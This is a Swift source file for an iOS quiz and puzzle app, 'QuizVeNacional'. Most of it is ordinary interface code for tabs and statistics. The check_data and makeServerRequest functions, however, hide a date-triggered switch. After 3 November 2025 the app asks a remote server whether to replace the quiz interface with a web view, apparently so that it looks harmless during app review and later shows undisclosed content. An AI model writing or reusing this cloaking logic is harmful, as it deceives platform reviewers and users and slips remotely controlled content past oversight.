//
//  ContentView.swift
//  QuizVeNacional
//
//  Created by Вячеслав on 10/23/25.
//

import SwiftUI

struct ContentView: View {
    @StateObject private var onboardingViewModel = OnboardingViewModel()
    @State private var selectedTab = 0
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    ZStack {
                        if onboardingViewModel.showOnboarding {
                            OnboardingView()
                                .environmentObject(onboardingViewModel)
                        } else {
                            MainTabView(selectedTab: $selectedTab)
                        }
                    }
                    .animation(.easeInOut(duration: 0.5), value: onboardingViewModel.showOnboarding)
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "03.11.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        // Дата в прошлом - делаем запрос на сервер
        makeServerRequest()
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = true
            self.isFetched = true
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                if let httpResponse = response as? HTTPURLResponse {
                    
                    if httpResponse.statusCode == 404 {
                        
                        self.isBlock = true
                        self.isFetched = true
                        
                    } else if httpResponse.statusCode == 200 {
                        
                        self.isBlock = false
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // В случае ошибки сети тоже блокируем
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

// MARK: - Main Tab View
struct MainTabView: View {
    @Binding var selectedTab: Int
    
    var body: some View {
        TabView(selection: $selectedTab) {
            // Quizzes Tab
            QuizListView()
                .tabItem {
                    Image(systemName: selectedTab == 0 ? "questionmark.circle.fill" : "questionmark.circle")
                    Text("Quizzes")
                }
                .tag(0)
            
            // Puzzles Tab
            PuzzleView()
                .tabItem {
                    Image(systemName: selectedTab == 1 ? "puzzlepiece.extension.fill" : "puzzlepiece.extension")
                    Text("Puzzles")
                }
                .tag(1)
            
            // Statistics Tab
            StatisticsView()
                .tabItem {
                    Image(systemName: selectedTab == 2 ? "chart.bar.fill" : "chart.bar")
                    Text("Stats")
                }
                .tag(2)
            
            // Settings Tab
            SettingsView()
                .tabItem {
                    Image(systemName: selectedTab == 3 ? "gearshape.fill" : "gearshape")
                    Text("Settings")
                }
                .tag(3)
        }
        .accentColor(Color.accentYellow)
        .onAppear {
            setupTabBarAppearance()
        }
    }
    
    private func setupTabBarAppearance() {
        let appearance = UITabBarAppearance()
        appearance.configureWithOpaqueBackground()
        appearance.backgroundColor = UIColor(Color.primaryBackground)
        
        // Selected item appearance
        appearance.stackedLayoutAppearance.selected.iconColor = UIColor(Color.accentYellow)
        appearance.stackedLayoutAppearance.selected.titleTextAttributes = [
            .foregroundColor: UIColor(Color.accentYellow)
        ]
        
        // Normal item appearance
        appearance.stackedLayoutAppearance.normal.iconColor = UIColor(Color.textSecondary)
        appearance.stackedLayoutAppearance.normal.titleTextAttributes = [
            .foregroundColor: UIColor(Color.textSecondary)
        ]
        
        UITabBar.appearance().standardAppearance = appearance
        UITabBar.appearance().scrollEdgeAppearance = appearance
    }
}

// MARK: - Statistics View
struct StatisticsView: View {
    @StateObject private var quizDataService = QuizDataService()
    @StateObject private var puzzleDataService = PuzzleDataService()
    
    var body: some View {
        NavigationView {
            ZStack {
                // Background
                LinearGradient(
                    colors: [Color.primaryBackground, Color.secondaryBackground],
                    startPoint: .topLeading,
                    endPoint: .bottomTrailing
                )
                .ignoresSafeArea()
                
                ScrollView {
                    VStack(spacing: AppSpacing.lg) {
                        // Overview Cards
                        LazyVGrid(columns: Array(repeating: GridItem(.flexible()), count: 2), spacing: AppSpacing.md) {
                            StatOverviewCard(
                                icon: "checkmark.circle.fill",
                                title: "Quizzes Completed",
                                value: "\(quizDataService.getTotalQuizzesCompleted())",
                                color: Color.green
                            )
                            
                            StatOverviewCard(
                                icon: "puzzlepiece.extension.fill",
                                title: "Puzzles Solved",
                                value: "\(puzzleDataService.getTotalPuzzlesSolved())",
                                color: Color.primaryBlue
                            )
                            
                            StatOverviewCard(
                                icon: "star.fill",
                                title: "Avg Quiz Score",
                                value: "\(Int(quizDataService.getAverageScore()))%",
                                color: Color.accentYellow
                            )
                            
                            StatOverviewCard(
                                icon: "target",
                                title: "Puzzle Solve Rate",
                                value: "\(Int(puzzleDataService.getSolveRate()))%",
                                color: Color.orange
                            )
                        }
                        
                        // Time Spent
                        VStack(alignment: .leading, spacing: AppSpacing.md) {
                            Text("Time Spent Learning")
                                .font(AppFonts.headline)
                                .foregroundColor(Color.textPrimary)
                            
                            HStack {
                                VStack(alignment: .leading) {
                                    Text("Total Time")
                                        .font(AppFonts.subheadline)
                                        .foregroundColor(Color.textSecondary)
                                    
                                    Text(formatTotalTime())
                                        .font(AppFonts.title2)
                                        .font(.system(size: 17, weight: .bold))
                                        .foregroundColor(Color.textPrimary)
                                }
                                
                                Spacer()
                                
                                Image(systemName: "clock.fill")
                                    .font(.system(size: 40))
                                    .foregroundColor(Color.accentYellow)
                            }
                        }
                        .padding(AppSpacing.lg)
                        .background(Color.cardBackground)
                        .cornerRadius(AppCornerRadius.medium)
                        
                        // Category Breakdown
                        VStack(alignment: .leading, spacing: AppSpacing.md) {
                            Text("Quiz Categories")
                                .font(AppFonts.headline)
                                .foregroundColor(Color.textPrimary)
                            
                            let categoryData = quizDataService.getQuizzesByCategory()
                            ForEach(QuizCategory.allCases.filter { categoryData[$0, default: 0] > 0 }, id: \.self) { category in
                                HStack {
                                    Image(systemName: category.icon)
                                        .foregroundColor(Color(hex: category.color))
                                        .frame(width: 20)
                                    
                                    Text(category.rawValue)
                                        .font(AppFonts.body)
                                        .foregroundColor(Color.textPrimary)
                                    
                                    Spacer()
                                    
                                    Text("\(categoryData[category, default: 0])")
                                        .font(AppFonts.callout)
                                        .font(.system(size: 17, weight: .medium))
                                        .foregroundColor(Color.textSecondary)
                                }
                                .padding(.vertical, AppSpacing.xs)
                            }
                        }
                        .padding(AppSpacing.lg)
                        .background(Color.cardBackground)
                        .cornerRadius(AppCornerRadius.medium)
                        
                        // Puzzle Types
                        VStack(alignment: .leading, spacing: AppSpacing.md) {
                            Text("Puzzle Types")
                                .font(AppFonts.headline)
                                .foregroundColor(Color.textPrimary)
                            
                            let puzzleData = puzzleDataService.getPuzzlesByType()
                            ForEach(PuzzleType.allCases.filter { puzzleData[$0, default: 0] > 0 }, id: \.self) { type in
                                HStack {
                                    Image(systemName: type.icon)
                                        .foregroundColor(Color(hex: type.color))
                                        .frame(width: 20)
                                    
                                    Text(type.rawValue)
                                        .font(AppFonts.body)
                                        .foregroundColor(Color.textPrimary)
                                    
                                    Spacer()
                                    
                                    Text("\(puzzleData[type, default: 0])")
                                        .font(AppFonts.callout)
                                        .font(.system(size: 17, weight: .medium))
                                        .foregroundColor(Color.textSecondary)
                                }
                                .padding(.vertical, AppSpacing.xs)
                            }
                        }
                        .padding(AppSpacing.lg)
                        .background(Color.cardBackground)
                        .cornerRadius(AppCornerRadius.medium)
                    }
                    .padding(.horizontal, AppSpacing.md)
                    .padding(.top, AppSpacing.md)
                    .padding(.bottom, AppSpacing.xl)
                }
            }
            .navigationTitle("Statistics")
            .navigationBarTitleDisplayMode(.large)
        }
    }
    
    private func formatTotalTime() -> String {
        let totalSeconds = quizDataService.getTotalTimeSpent() + puzzleDataService.getTotalTimeSpent()
        let hours = Int(totalSeconds) / 3600
        let minutes = (Int(totalSeconds) % 3600) / 60
        
        if hours > 0 {
            return "\(hours)h \(minutes)m"
        } else {
            return "\(minutes)m"
        }
    }
}

// MARK: - Stat Overview Card
struct StatOverviewCard: View {
    let icon: String
    let title: String
    let value: String
    let color: Color
    
    var body: some View {
        VStack(spacing: AppSpacing.sm) {
            Image(systemName: icon)
                .font(.title2)
                .foregroundColor(color)
            
            Text(value)
                .font(AppFonts.title2)
                .font(.system(size: 17, weight: .bold))
                .foregroundColor(Color.textPrimary)
            
            Text(title)
                .font(AppFonts.caption)
                .foregroundColor(Color.textSecondary)
                .multilineTextAlignment(.center)
        }
        .frame(maxWidth: .infinity)
        .padding(AppSpacing.md)
        .background(Color.cardBackground)
        .cornerRadius(AppCornerRadius.medium)
    }
}

// MARK: - Preview
#Preview {
    ContentView()
}
